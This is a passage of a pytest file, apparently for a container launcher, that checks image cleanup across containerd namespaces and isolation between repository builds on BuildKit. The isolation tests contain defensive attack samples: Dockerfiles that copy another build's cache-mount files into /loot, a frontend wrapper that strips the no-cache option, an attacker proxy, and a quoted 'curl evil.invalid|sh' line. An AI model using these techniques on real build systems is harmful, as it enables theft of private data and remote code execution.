  case "$1 ${2:-}" in
    "images --format")
      [ -n "${LIST_FAIL:-}" ] && return 1
      [ -f "$IMAGES.$_ns" ] && while IFS= read -r _l; do echo "$_l"; done \
        < "$IMAGES.$_ns"
      return 0 ;;
    "image rm")
      case " $IN_USE " in *" $3 "*) return 1 ;; esac
      local _l _keep=""
      while IFS= read -r _l; do
        [ "$_l" = "$3" ] || _keep="$_keep$_l"$'\n'
      done < "$IMAGES.$_ns"
      printf '%s' "$_keep" > "$IMAGES.$_ns"
      return 0 ;;
    "ps -a")
      printf '%s' "${CONTAINERS:-}"
      return 0 ;;
  esac
  return 9
}
'''


@pytest.mark.parametrize("in_use,list_fail,refused,holder", [
    ("", "", False, ""),
    ("leerie-repo/enricai-barnacle:0.43.0", "", True, "Up 3 hours"),
    ("leerie-repo/enricai-barnacle:0.43.0", "", True,
     "Exited (137) 2 days ago"),
    ("", "1", True, ""),
])
def test_leeries_old_repository_images_are_swept_from_the_workers(
        tmp_path, in_use, list_fail, refused, holder):
    """`leerie_sweep_worker_images`: from each namespace a worker reads,
    every `leerie-repo/…` image is removed, never forced, and nothing else;
    one a container still uses is left and the build refused, naming it,
    the container that holds it, its state and what ends it: `leerie stop`
    for a running one, `nerdctl rm <id>` for one that no longer runs (its
    client died, so its `--rm` never ran: review round 38, execution X1),
    never `image rm`, which fails while a container holds the image; a
    namespace that cannot be listed refuses too. Falsified (2026-11-03):
    the second listing dropped (the in-use case passes); `image rm -f`
    (the stub refuses no forced removal, so the log shows it: fails); the
    holders' listing dropped (the refusal names no container)."""
    images = tmp_path / "images"
    (tmp_path / "images.default").write_text(
        "leerie-repo/enricai-barnacle:0.43.0\n"
        "leerie-repo/repo-d07714eaab33:0.43.0\n"
        "leerie:0.43.0\nmy-company/app:1\nnot-leerie-repo/x:1\n"
        "docker.io/leerie-repo/old:0.42.0\n")
    log = tmp_path / "nerdctl.log"
    r = subprocess.run(
        ["bash", "-c", _check_script(
            _SWEEP_NERDCTL + 'leerie_buildkit_check || exit 3\n'
            'if leerie_sweep_worker_images; then echo SWEPT; '
            'else echo "REFUSED $LEERIE_BUILDKIT_REFUSAL"; fi\n')],
        capture_output=True, text=True, timeout=60,
        env={"PATH": "/usr/bin:/bin", "NERDCTL_LOG": str(log),
             "IMAGES": str(images), "IN_USE": in_use,
             "LIST_FAIL": list_fail,
             "CONTAINERS": (f"0c1d2e3f4a5b|{in_use}|{holder}\n"
                            "9a8b7c6d5e4f|my-company/app:1|Up 1 hour\n")
             if in_use else ""})
    calls = log.read_text().splitlines()
    rms = [c for c in calls if " image rm " in f" {c} "]
    assert all(c.startswith("--namespace default ") for c in calls), calls
    assert not any(" -f" in c or "--force" in c for c in rms), rms
    if list_fail:
        assert r.stdout.startswith("REFUSED could not list"), r.stdout
        assert rms == []
        return
    assert sorted(c.split()[-1] for c in rms) == [
        "docker.io/leerie-repo/old:0.42.0",
        "leerie-repo/enricai-barnacle:0.43.0",
        "leerie-repo/repo-d07714eaab33:0.43.0"], rms
    left = (tmp_path / "images.default").read_text().split()
    assert set(left) >= {"leerie:0.43.0", "my-company/app:1",
                         "not-leerie-repo/x:1"}, left
    if refused:
        assert r.stdout.startswith("REFUSED ") and in_use in r.stdout, \
            r.stdout
        assert "image rm" not in r.stdout, r.stdout
        assert f"container 0c1d2e3f4a5b ({holder})" in r.stdout, r.stdout
        assert "9a8b7c6d5e4f" not in r.stdout, r.stdout
        if holder.startswith("Up"):
            assert "end its run (leerie stop <run-id>)" in r.stdout
        else:
            assert ("remove it with: nerdctl --namespace default rm "
                    "0c1d2e3f4a5b") in r.stdout, r.stdout
    else:
        assert r.stdout == "SWEPT\n", (r.stdout, r.stderr)
        assert not any(x.startswith(("leerie-repo/", "docker.io/leerie-repo/"))
                       for x in left), left


@pytest.mark.parametrize("in_use", ["", "leerie-repo/enricai-barnacle:0.43.0"])
def test_build_push_local_build_sweeps_before_it_builds(tmp_path, in_use):
    """Review round 38, isolation X3: `build-push.sh --local-build` builds
    the repository's own file too (the launcher's `_fly_push
    --dockerfile`), so it runs `leerie_sweep_worker_images` after the
    check, before its build: an unused `leerie-repo/…` image an earlier
    leerie left where the worker reads is removed first, and one a
    container still uses refuses the build, naming it, with no build run.
    Falsified live (2026-11-03): the sweep's call removed from
    build-push.sh (the unused image is still there at the build, and the
    in-use case builds)."""
    sd = tmp_path / "sweep-bin"
    sd.mkdir()
    stub = sd / "nerdctl"
    stub.write_text("#!/bin/bash\n" + _SWEEP_NERDCTL
                    + 'nerdctl "$@"; _rc=$?\n[ "$_rc" -eq 9 ] && exit 0\n'
                      'exit "$_rc"\n')
    stub.chmod(0o755)
    images = tmp_path / "images"
    (tmp_path / "images.default").write_text(
        "leerie-repo/enricai-barnacle:0.43.0\nmy-company/app:1\n")
    log = tmp_path / "sweep.log"
    r = _build_push(tmp_path, "--app", "testapp", "--push", "--local-build",
                    env_extra={"PATH": f"{sd}:{tmp_path}:/usr/bin:/bin",
                               "NERDCTL_LOG": str(log), "IMAGES": str(images),
                               "IN_USE": in_use, "LIST_FAIL": ""})
    calls = log.read_text().splitlines()
    builds = [i for i, c in enumerate(calls) if _is_build(c)]
    rms = [i for i, c in enumerate(calls) if " image rm " in f" {c} "]
    assert rms, calls
    if in_use:
        assert r.returncode == 1, (r.stdout, r.stderr)
        assert in_use in r.stderr and "build-push: " in r.stderr, r.stderr
        assert builds == [], calls
    else:
        assert r.returncode == 0, r.stderr
        assert len(builds) == 1 and max(rms) < builds[0], calls
        left = (tmp_path / "images.default").read_text().split()
        assert left == ["my-company/app:1"], left


@pytest.mark.skipif(sys.platform == "darwin" or os.geteuid() == 0,
                    reason="reads the rootless user's containerd config")
@pytest.mark.parametrize("config,isolated", [
    (None, False),
    ("", False),
    ("version = 2\n", False),
    ('[plugins."io.containerd.metadata.v1.bolt"]\n'
     '  content_sharing_policy = "shared"\n', False),
    ('[plugins."io.containerd.metadata.v1.bolt"]\n'
     '  # content_sharing_policy = "isolated"\n', False),
    ('version = 2\n\n[plugins."io.containerd.metadata.v1.bolt"]\n'
     '  content_sharing_policy = "isolated"\n', True),
    ("version = 3\n[plugins.'io.containerd.metadata.v1.bolt']\n"
     "    content_sharing_policy = 'isolated'", True),
])
def test_a_shared_content_store_is_warned_of_before_a_build(
        tmp_path, config, isolated):
    """Review round 38, isolation X2: `leerie_content_sharing_check` reads
    the rootless containerd's config and passes only when it sets
    `content_sharing_policy` to "isolated" (either quoting, as containerd
    writes v2 and v3); otherwise its hint names the file, the lines and the
    restart, and that the restart stops every running container (the
    launcher's warning, run, is in test_image_steps_run_once.py).
    Falsified live (2026-11-03): the check made to return 0 always (every
    non-isolated case fails)."""
    xdg = tmp_path / "xdg"
    if config is not None:
        (xdg / "containerd").mkdir(parents=True)
        (xdg / "containerd" / "config.toml").write_text(config)
    r = subprocess.run(
        ["bash", "-c", FRONTEND_SH_SOURCE
         + 'if leerie_content_sharing_check; then echo PASS; '
           'else echo "HINT $LEERIE_CONTENT_SHARING_HINT"; fi\n'],
        capture_output=True, text=True, timeout=60,
        env={"PATH": "/usr/bin:/bin", "HOME": str(tmp_path),
             "XDG_CONFIG_HOME": str(xdg)})
    if isolated:
        assert r.stdout == "PASS\n", (r.stdout, r.stderr)
        return
    hint = r.stdout
    assert hint.startswith("HINT containerd shares stored content"), hint
    assert f"{xdg}/containerd/config.toml" in hint
    assert 'content_sharing_policy = \"isolated\"' in hint
    assert "systemctl --user restart containerd (it stops every running " \
           "container)" in hint


def test_a_runs_container_is_found_in_leeries_namespace_then_default(
        tmp_path):
    """`_container_ns`: leerie's namespace first, then `default`, where a
    run an earlier leerie launched keeps its container; nothing when
    neither holds it. Falsified (2026-11-03): `default` dropped from the
    lookup (the earlier run's container is not found)."""
    fn = _launcher_fn("_container_ns")
    stub = ('nerdctl() { echo "$*" >> "$NERDCTL_LOG"; '
            '[ "$1 $2 $3" = "--namespace $HOLDER inspect" ]; }\n')
    for holder, want in (("leerie", "leerie\n"), ("default", "default\n"),
                         ("other", "")):
        log = tmp_path / f"{holder}.log"
        r = subprocess.run(
            ["bash", "-c", "set -uo pipefail\n" + FRONTEND_SH_SOURCE + stub
             + fn + '_container_ns run-1 || echo -n ""\n'],
            capture_output=True, text=True, timeout=60,
            env={"PATH": "/usr/bin:/bin", "NERDCTL_LOG": str(log),
                 "HOLDER": holder})
        assert r.stdout == want, (holder, r.stdout, r.stderr)
        assert log.read_text().splitlines()[0] == \
            "--namespace leerie inspect run-1"


@pytest.mark.parametrize("verb", [["stop"], ["kill", "--force"]])
def test_stop_and_kill_remove_the_container_they_end(tmp_path, verb):
    """Review round 38, execution X1: `--rm` is the nerdctl client's, so a
    container whose client died stays Exited after `nerdctl stop`/`kill`
    and holds its image for good (measured). The real launcher's local
    `stop` and `kill`, against a builtins-only `nerdctl`, follow the stop or
    kill with `nerdctl rm -f` of the same container, in the namespace it
    was found in. Falsified live (2026-11-03): the `rm` dropped from either
    (no rm in the log)."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    log = tmp_path / "nerdctl.log"
    stub = bindir / "nerdctl"
    stub.write_text("#!/bin/bash\n"
                    f'printf \'%s\\n\' "$*" >> "{log}"\n'
                    '[ "$1 $2 $3" = "--namespace default inspect" ] && exit 0\n'
                    '[ "$3" = inspect ] && exit 1\n'
                    "exit 0\n")
    stub.chmod(0o755)
    state = tmp_path / "state"
    # Not UUID-shaped: a UUID is taken as a chain or group id first.
    run = "run-x1"
    (state / "runs" / run).mkdir(parents=True)
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    run_git_out(repo, "init", "-q")
    r = subprocess.run(
        [str(LAUNCHER), *verb, run, "--runtime", "local"],
        capture_output=True, text=True, timeout=120, cwd=repo,
        env={"PATH": f"{bindir}:/usr/bin:/bin", "HOME": str(home),
             "LEERIE_STATE_DIR": str(state),
             "LEERIE_HOST_DIR": str(tmp_path / "host")})
    calls = log.read_text().splitlines() if log.exists() else []
    end = "stop" if verb[0] == "stop" else "kill"
    i = calls.index(f"--namespace default {end} {run}")
    assert f"--namespace default rm -f {run}" in calls[i + 1:], \
        (calls, r.stdout, r.stderr)


# --- the real builds (opt-in), on a BuildKit of the test's own ---------------

_NERDCTL = shutil.which("nerdctl")
_BUILDKITD = shutil.which("buildkitd")
_SETUPTOOL = shutil.which("containerd-rootless-setuptool.sh")
_real = pytest.mark.skipif(
    not os.environ.get("LEERIE_TEST_BUILDKIT_ISOLATION")
    or not (_NERDCTL and _BUILDKITD and _SETUPTOOL
            and os.environ.get("XDG_RUNTIME_DIR")),
    reason="LEERIE_TEST_BUILDKIT_ISOLATION=1 starts a BuildKit daemon and a "
           "containerd namespace of its own (rootless) and builds on them")
BASE_PULL = "debian:13-slim"


@pytest.fixture(scope="module")
def buildkit(tmp_path_factory):
    """A buildkitd in the rootless containerd's namespaces, with its own
    root, socket and containerd worker namespace (`ns`), and a second
    namespace of the test's own standing for leerie's (`repo_ns`, which the
    worker does not read; the launcher's text is given it as
    LEERIE_IMAGE_NS). Both hold `debian:13-slim` as the base image
    `leerie-test-base:1`, as the launcher's base build and
    `ensure_base_in_worker_ns` leave it. All removed afterwards."""
    nonce = secrets.token_hex(4)
    ns = f"leerie-test-{nonce}"
    repo_ns = f"{ns}-repo"
    root = tmp_path_factory.mktemp("bk")
    sockdir = Path(os.environ["XDG_RUNTIME_DIR"]) / f"leerie-test-bk-{nonce}"
    sockdir.mkdir()
    sock = sockdir / "buildkitd.sock"
    proc = subprocess.Popen(
        [_SETUPTOOL, "nsenter", "--", _BUILDKITD, "--oci-worker=false",
         "--containerd-worker=true", "--containerd-worker-rootless=true",
         f"--containerd-worker-namespace={ns}",
         "--containerd-worker-net=host", f"--root={root}",
         f"--addr=unix://{sock}"],
        start_new_session=True, stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL)
    nc = [_NERDCTL, "--namespace", ns]
    rc = [_NERDCTL, "--namespace", repo_ns]
    try:
        deadline = time.monotonic() + 60
        while not sock.exists() and time.monotonic() < deadline:
            time.sleep(0.2)
        assert sock.exists(), "the test's buildkitd did not start"
        for c in (nc, rc):
            subprocess.run([*c, "pull", "-q", BASE_PULL], check=True,
                           capture_output=True, timeout=600)
            subprocess.run([*c, "tag", BASE_PULL, "leerie-test-base:1"],
                           check=True, capture_output=True)
        yield {"ns": ns, "repo_ns": repo_ns, "host": f"unix://{sock}",
               "nc": nc, "rc": rc}
    finally:
        buildctl = shutil.which("buildctl")
        if buildctl:
            subprocess.run([buildctl, "--addr", f"unix://{sock}", "prune",
                            "--all"], capture_output=True, timeout=300)
        os.killpg(proc.pid, signal.SIGTERM)
        try:
            proc.wait(timeout=30)
        except subprocess.TimeoutExpired:
            os.killpg(proc.pid, signal.SIGKILL)
            proc.wait(timeout=30)
        for c in (nc, rc):
            ctrs = subprocess.run([*c, "ps", "-aq"], capture_output=True,
                                  text=True).stdout.split()
            if ctrs:
                subprocess.run([*c, "rm", "-f", *ctrs], capture_output=True)
            imgs = subprocess.run([*c, "image", "ls", "-q"],
                                  capture_output=True, text=True).stdout.split()
            if imgs:
                subprocess.run([*c, "image", "rm", "-f", *set(imgs)],
                               capture_output=True)
        _remove_namespace(ns)
        _remove_namespace(repo_ns)
        _remove_namespace(f"{ns}_history")
        shutil.rmtree(sockdir, ignore_errors=True)


def _remove_namespace(ns: str) -> None:
    """BuildKit records each build's history in `<ns>_history`, held by
    leases: its leases and blobs go first, then the namespace."""
    ctr = [_SETUPTOOL, "nsenter", "--", "ctr", "-n", ns]
    for kind in ("leases", "content"):
        ids = subprocess.run([*ctr, kind, "ls", "-q"], capture_output=True,
                             text=True).stdout.split()
        if ids:
            subprocess.run([*ctr, kind, "rm", *ids], capture_output=True)
    subprocess.run([_NERDCTL, "namespace", "rm", ns], capture_output=True)


def _wrapper(bk: dict) -> str:
    """For the launcher's text, sourced after FRONTEND_SH_SOURCE: the real
    `nerdctl` by absolute path, and the test's namespace as leerie's
    (LEERIE_IMAGE_NS). Every nerdctl command the text runs names its
    namespace, and BUILDKIT_HOST (_real_env) makes leerie_buildkit_resolve
    find the test's daemon, whose worker reads `bk["ns"]`."""
    return (f'nerdctl() {{ "{_NERDCTL}" "$@"; }}\n'
            f'LEERIE_IMAGE_NS={bk["repo_ns"]}\n')


def _real_env(bk: dict, **extra: str) -> dict:
    return {**os.environ, "BUILDKIT_HOST": bk["host"], **extra}


def _real_repo_build_start(bk: dict, repo: Path, state: Path,
                           tag: str, pre: str = "",
                           **env: str) -> subprocess.Popen:
    """`build_repo_image <tag>` on the test's daemon; `pre` is bash run
    after the launcher's functions are defined, `env` more environment."""
    state.mkdir(parents=True, exist_ok=True)
    script = ("set -euo pipefail\n" + LOG_SH_SOURCE + FRONTEND_SH_SOURCE
              + 'remote_log() { echo "$*" >&2; }\n' + _wrapper(bk) + _fns()
              + _launcher_fn("build_repo_image") + pre
              + f"\n_repo_image_prepare\nbuild_repo_image {tag}\n"
              "_repo_build_done\n")
    return subprocess.Popen(["bash", "-c", script], stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, text=True,
                            env=_real_env(bk, USER_REPO=str(repo),
                                          LEERIE_STATE_HOST_DIR=str(state),
                                          IMAGE_TAG="leerie-test-base:1",
                                          **env))


def _real_repo_build_end(p: subprocess.Popen, ok: bool = True) -> str:
    """Waits for the build; asserts it succeeded (`ok`) or failed, and
    returns its stderr."""
    try:
        _, err = p.communicate(timeout=1800)
    finally:
        if p.poll() is None:
            p.kill()
            p.wait(timeout=30)
    assert (p.returncode == 0) is ok, err[-4000:]
    return err


def _real_repo_build(bk: dict, repo: Path, state: Path, tag: str) -> None:
    _real_repo_build_end(_real_repo_build_start(bk, repo, state, tag))


def _cat(bk: dict, tag: str, path: str, ns: str = "rc") -> str:
    """`path` in the image `tag`, in leerie's namespace (`rc`) unless the
    test built it itself in the worker's (`nc`)."""
    return subprocess.run(
        [*bk[ns], "run", "--rm", "--network", "none", "--entrypoint",
         "/bin/cat", tag, path], capture_output=True, text=True,
        timeout=300).stdout


@_real
def test_two_builds_at_once_share_no_cache_mount(buildkit, tmp_path):
    """Review round 36, isolation I2, made from its proof: two repository
    builds through `build_repo_image`, overlapping on one BuildKit, both
    with the pinned frontend and `--no-cache`. Attacker A runs 40 short
    steps on a cache mount, each copying out what is there and planting a
    file; victim V, started 2 s later, puts its committed private file in
    the same mount's target, works for 25 s, then installs what the mount
    holds. Neither sees the other's: A's image holds nothing of V's file,
    and V's step reads its own mount. The steps' clocks must show A's
    steps running inside V's, or the test proves nothing and fails.
    Falsified live (2026-11-03): without the namespace on
    `build_repo_image`'s first build, the steps overlapped and A's image
    held V's private file."""
    tag = secrets.token_hex(4)
    mnt = "/root/.cache/pip"
    atk = f"ARG BASE_IMAGE\nFROM $BASE_IMAGE\nRUN mkdir /loot && sleep 6 # {tag}\n"
    for i in range(40):
        atk += (f"RUN --mount=type=cache,target={mnt} sh -c 'cat "
                f"{mnt}/private-wheel >> /loot/seen 2>/dev/null; date +%s "
                f">> /loot/times; echo ATTACKER-PLANT-{tag} > {mnt}/planted; "
                f"sleep 1' # {i}\n")
    a = _one_file_repo(tmp_path / "a", atk)
    private = f"V-PRIVATE-{secrets.token_hex(6)}"
    v = tmp_path / "v"
    v.mkdir()
    (v / "private.txt").write_text(private + "\n")
    v = _one_file_repo(v, (
        f"ARG BASE_IMAGE\nFROM $BASE_IMAGE\nCOPY private.txt /p\n"
        f"RUN --mount=type=cache,target={mnt} sh -c 'date +%s > /vstart; "
        f"cp /p {mnt}/private-wheel; sleep 25; cat {mnt}/planted > "
        f"/installed 2>/dev/null || echo clean > /installed; date +%s > "
        f"/vend' # {tag}\n"))
    pa = _real_repo_build_start(buildkit, a, tmp_path / "sa",
                                f"leerie-test-i2:a{tag}")
    try:
        time.sleep(2)
        _real_repo_build(buildkit, v, tmp_path / "sv", f"leerie-test-i2:v{tag}")
    finally:
        _real_repo_build_end(pa)
    root = "/opt/leerie-worker-root"
    at, vt = f"leerie-test-i2:a{tag}", f"leerie-test-i2:v{tag}"
    times = [int(x) for x in _cat(buildkit, at, f"{root}/loot/times").split()]
    vstart = int(_cat(buildkit, vt, f"{root}/vstart"))
    vend = int(_cat(buildkit, vt, f"{root}/vend"))
    assert any(vstart < t < vend for t in times), \
        ("the builds did not overlap", vstart, vend, times)
    assert private not in _cat(buildkit, at, f"{root}/loot/seen")
    assert _cat(buildkit, vt, f"{root}/installed") == "clean\n"


@_real
def test_a_contributors_branch_cannot_build_the_trusted_branchs_root(
        buildkit, tmp_path):
    """R1 through `build_repo_image` on a real BuildKit: the contributor's
    branch is built first, then main, each from its own build directory.
    Falsified: without `_repo_context_retime`, main's worker root held
    `curl evil.invalid|sh #xyz`."""
    df = "ARG BASE_IMAGE\nFROM $BASE_IMAGE\nCOPY install.sh /install.sh\n"
    repo = _two_branch_repo(tmp_path, df)
    _in_repo(repo, "checkout", "-q", "contrib")
    _real_repo_build(buildkit, repo, tmp_path / "s1", "leerie-test-r1:c")
    _in_repo(repo, "checkout", "-q", "main")
    _real_repo_build(buildkit, repo, tmp_path / "s2", "leerie-test-r1:m")
    assert _cat(buildkit, "leerie-test-r1:m",
                "/opt/leerie-worker-root/install.sh") \
        == "echo trusted-install-main\n"


def _one_file_repo(root: Path, dockerfile: str) -> Path:
    repo = root
    repo.mkdir(parents=True, exist_ok=True)
    _in_repo(repo, "init", "-q", "-b", "main")
    (repo / ".leerie").mkdir()
    (repo / ".leerie" / "Dockerfile").write_text(dockerfile)
    _in_repo(repo, "add", "-A")
    _in_repo(repo, "commit", "-qm", "c")
    return repo


@_real
def test_a_repositorys_build_reads_no_cache_mount_another_filled(
        buildkit, tmp_path):
    """Repository A plants a file in a cache mount; repository B's build
    of the same mount sees it empty. Falsified: without `--no-cache` on the
    first build, B read `planted-by-A`."""
    target = f"/var/cache/leerie-test-{secrets.token_hex(4)}"
    a = _one_file_repo(tmp_path / "a", (
        f"ARG BASE_IMAGE\nFROM $BASE_IMAGE\nRUN --mount=type=cache,"
        f"target={target} echo planted-by-A > {target}/f\n"))
    b = _one_file_repo(tmp_path / "b", (
        f"ARG BASE_IMAGE\nFROM $BASE_IMAGE\nRUN --mount=type=cache,"
        f"target={target} (cat {target}/f 2>/dev/null || echo empty) "
        "> /seen\n"))
    _real_repo_build(buildkit, a, tmp_path / "sa", "leerie-test-r3:a")
    _real_repo_build(buildkit, b, tmp_path / "sb", "leerie-test-r3:b")
    assert _cat(buildkit, "leerie-test-r3:b",
                "/opt/leerie-worker-root/seen") == "empty\n"


@_real
def test_leeries_base_is_never_built_from_a_step_another_build_cached(
        buildkit, tmp_path):
    """R2: another build runs the base Dockerfile's step through a proxy
    (here the client's build argument, the route a frontend takes through
    ProxyEnv), which BuildKit leaves out of the step's key; then the
    launcher's base build runs. Falsified: without `--no-cache` there, the
    base's step was CACHED and held the attacker's proxy."""
    ctx = tmp_path / "leerie"
    ctx.mkdir()
    (ctx / "Dockerfile").write_text(
        "FROM leerie-test-base:1\nRUN echo \"proxy=${HTTP_PROXY:-none} "
        f"{secrets.token_hex(4)}\" > /proxy-seen\n")
    subprocess.run([*buildkit["nc"], "build", "--buildkit-host",
                    buildkit["host"], "--build-arg",
                    "HTTP_PROXY=http://attacker.invalid:3128", "-t",
                    "leerie-test-r2:attacker", str(ctx)], check=True,
                   capture_output=True, timeout=600)
    assert "attacker.invalid" in _cat(buildkit, "leerie-test-r2:attacker",
                                      "/proxy-seen", ns="nc")
    state = tmp_path / "state"
    state.mkdir()
    script = ("set -euo pipefail\n" + LOG_SH_SOURCE + FRONTEND_SH_SOURCE
              + 'remote_log() { echo "$*" >&2; }\n' + _wrapper(buildkit)
              + _fns() + extract_block(_text(), *BASE_BLOCK))
    r = subprocess.run(["bash", "-c", script], capture_output=True, text=True,
                       timeout=1800,
                       env=_real_env(buildkit, IMAGE_TAG="leerie-test-r2:base",
                                     LEERIE_REPO=str(ctx),
                                     LEERIE_STATE_HOST_DIR=str(state)))
    assert r.returncode == 0, r.stderr[-4000:]
    assert _cat(buildkit, "leerie-test-r2:base",
                "/proxy-seen").startswith("proxy=none ")


def _evil_frontend(bk: dict, root: Path) -> str:
    """Review round 35's hostile frontend: the official `docker/dockerfile:1`
    image, unchanged, behind a two-line wrapper that unsets the `no-cache`
    option BuildKit hands a gateway frontend
    (`BUILDKIT_FRONTEND_OPT_<n>=no-cache=`). A repository can publish it
    anywhere and name it in `# syntax=`."""
    name = f"leerie-test-evil-frontend:{secrets.token_hex(4)}"
    d = root / "evil"
    d.mkdir()
    (d / "wrap.sh").write_text(
        "for v in $(/busybox env | /busybox sed -n "
        "'s/^\\(BUILDKIT_FRONTEND_OPT_[0-9]*\\)=no-cache=.*/\\1/p'); "
        'do unset "$v"; done\nexec /bin/dockerfile-frontend\n')
    (d / "Dockerfile").write_text(
        "FROM busybox:musl AS bb\nFROM docker/dockerfile:1\n"
        "COPY --from=bb /bin/busybox /busybox\nCOPY wrap.sh /wrap.sh\n"
        'ENTRYPOINT ["/busybox", "sh", "/wrap.sh"]\n')
    subprocess.run([*bk["nc"], "build", "--buildkit-host", bk["host"], "-q",
                    "-t", name, str(d)], check=True, capture_output=True,
                   timeout=900)
    return name


@_real
def test_a_repositorys_frontend_reads_no_cache_mount_another_filled(
        buildkit, tmp_path):
    """Review round 35, isolation I1, through `build_repo_image` on a real
    BuildKit: repository V copies a committed private file into a cache
    mount; repository A, whose `# syntax=` names a frontend that drops the
    `no-cache` option, reads the same mount. Both are given `--no-cache`,
    as every build is. Falsified: without the pinned frontend (the parent
    tree), A's worker root held V's file."""
    evil = _evil_frontend(buildkit, tmp_path)
    target = f"/var/cache/leerie-test-{secrets.token_hex(4)}"
    secret = f"V-PRIVATE-{secrets.token_hex(6)}"
    v = tmp_path / "v"
    v.mkdir()
    (v / "private.txt").write_text(secret + "\n")
    v = _one_file_repo(v, (
        "ARG BASE_IMAGE\nFROM $BASE_IMAGE\nCOPY private.txt /p\n"
        f"RUN --mount=type=cache,target={target} cp /p {target}/wheel\n"))
    a = _one_file_repo(tmp_path / "a", (
        f"# syntax={evil}\nARG BASE_IMAGE\nFROM $BASE_IMAGE\n"
        f"RUN --mount=type=cache,target={target} sh -c '(cat {target}/wheel "
        "2>/dev/null || echo nothing) > /stolen'\n"))
    _real_repo_build(buildkit, v, tmp_path / "sv", "leerie-test-i1:v")
    _real_repo_build(buildkit, a, tmp_path / "sa", "leerie-test-i1:a")
    assert _cat(buildkit, "leerie-test-i1:a",
                "/opt/leerie-worker-root/stolen") == "nothing\n"


@_real
def test_the_pulled_frontend_builds_without_the_network(buildkit, tmp_path):
    """`ensure_frontend_in_worker_ns`, finding the test's daemon (whose
    worker reads the test's namespace), then a second buildkitd on that
    namespace with an empty
    root (BuildKit's cache as after a prune) and its registry access cut
    (a proxy on a closed port): a build given the pin builds. Falsified:
    without the pull, the build failed to resolve the frontend."""
    frontend = _frontend()
    # Nothing of the frontend's is left where BuildKit could find it: the
    # fixture's daemon's cache (which leases its blobs in the shared
    # namespace) pruned, and its image record removed.
    subprocess.run([shutil.which("buildctl") or "buildctl", "--addr",
                    buildkit["host"], "prune", "--all"],
                   capture_output=True, timeout=300)
    subprocess.run([*buildkit["nc"], "image", "rm", "-f", frontend],
                   capture_output=True, timeout=120)
    r = subprocess.run(
        ["bash", "-c", "set -euo pipefail\n" + LOG_SH_SOURCE
         + FRONTEND_SH_SOURCE + _wrapper(buildkit)
         + "ensure_frontend_in_worker_ns\n"],
        capture_output=True, text=True, timeout=600,
        env=_real_env(buildkit))
    assert r.returncode == 0, r.stderr
    nonce = secrets.token_hex(4)
    sockdir = Path(os.environ["XDG_RUNTIME_DIR"]) / f"leerie-test-bk-{nonce}"
    sockdir.mkdir()
    sock = sockdir / "buildkitd.sock"
    dead = "http://127.0.0.1:9"
    proc = subprocess.Popen(
        [_SETUPTOOL, "nsenter", "--", _BUILDKITD, "--oci-worker=false",
         "--containerd-worker=true", "--containerd-worker-rootless=true",
         f"--containerd-worker-namespace={buildkit['ns']}",
         "--containerd-worker-net=host", f"--root={tmp_path / 'root2'}",
         f"--addr=unix://{sock}"],
        start_new_session=True, stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        env={**os.environ, "HTTPS_PROXY": dead, "HTTP_PROXY": dead,
             "https_proxy": dead, "http_proxy": dead, "NO_PROXY": "",
             "no_proxy": ""})
    try:
        deadline = time.monotonic() + 60
        while not sock.exists() and time.monotonic() < deadline:
            time.sleep(0.2)
        assert sock.exists(), "the offline buildkitd did not start"
        ctx = tmp_path / "ctx"
        ctx.mkdir()
        (ctx / "Dockerfile").write_text("FROM scratch\nCOPY f /f\n")
        (ctx / "f").write_text("f\n")
        offline = subprocess.run(
            [*buildkit["nc"], "build", "--buildkit-host", f"unix://{sock}",
             "--no-cache", "--build-arg", f"BUILDKIT_SYNTAX={frontend}",
             "-o", f"type=oci,dest={tmp_path / 'out.tar'}", str(ctx)],
            capture_output=True, text=True, timeout=600)
        assert offline.returncode == 0, offline.stderr[-3000:]
        # The daemon had no registry: an image it does not hold fails, at
        # the dead proxy.
        (ctx / "Dockerfile").write_text("FROM alpine:3.20\n")
        online = subprocess.run(
            [*buildkit["nc"], "build", "--buildkit-host", f"unix://{sock}",
             "-o", f"type=oci,dest={tmp_path / 'out2.tar'}", str(ctx)],
            capture_output=True, text=True, timeout=600)
        assert online.returncode != 0 and "127.0.0.1:9" in online.stderr, \
            online.stderr[-3000:]
    finally:
        buildctl = shutil.which("buildctl")
        if buildctl and sock.exists():
            subprocess.run([buildctl, "--addr", f"unix://{sock}", "prune",
                            "--all"], capture_output=True, timeout=300)
        os.killpg(proc.pid, signal.SIGTERM)
        try:
            proc.wait(timeout=30)
        except subprocess.TimeoutExpired:
            os.killpg(proc.pid, signal.SIGKILL)
            proc.wait(timeout=30)
        shutil.rmtree(sockdir, ignore_errors=True)


# --- review round 37, isolation I3 and I4, on a real BuildKit ---------------

_WORKER_ROOT_FILE = "/opt/leerie-worker-root/srv/private.txt"


def _victim(bk: dict, tmp_path: Path, image_ns: str | None = None,
            pre: str = "") -> tuple[str, str]:
    """A repository whose committed private file its Dockerfile copies into
    its worker root, built by `build_repo_image` under the name leerie gives
    a repository image; returns (that name, the file's content)."""
    secret = f"V-PRIVATE-{secrets.token_hex(6)}"
    v = tmp_path / "victim"
    v.mkdir()
    (v / "private.txt").write_text(secret + "\n")
    v = _one_file_repo(v, "ARG BASE_IMAGE\nFROM $BASE_IMAGE\n"
                          "COPY private.txt /srv/private.txt\n")
    tag = f"leerie-repo/victim-org-victim-{secrets.token_hex(6)}:0.43.0"
    env = {"LEERIE_TEST_IMAGE_NS": image_ns} if image_ns else {}
    _real_repo_build_end(_real_repo_build_start(
        bk, v, tmp_path / "s-victim", tag, pre, **env))
    return tag, secret


# Leerie's images in the worker's own namespace, as before the fix: the
# namespace leerie tags in is the worker's, and the check that refuses it
# is overridden. The control that shows the harness detects the read.
_AS_BEFORE = ('\nLEERIE_IMAGE_NS="$LEERIE_TEST_IMAGE_NS"\n'
              "leerie_buildkit_check() { leerie_buildkit_resolve; }\n")


@_real
def test_a_repositorys_build_cannot_name_another_repositorys_image(
        buildkit, tmp_path):
    """Review round 37, isolation I3, made from its proof
    (image_store_from_read.sh): a victim repository's image is built by
    `build_repo_image` under leerie's name for it, `leerie-repo/<owner>-
    <repo>-<hash>:<version>`, which is guessable; an attacking repository's
    Dockerfile names it, as a `FROM` whose file it copies and as a `RUN
    --mount=type=bind,from=`. Neither build reads it: the name is in
    leerie's namespace, which the worker does not read, and the registry
    refuses it ("pull access denied"). The victim's own `FROM $BASE_IMAGE`
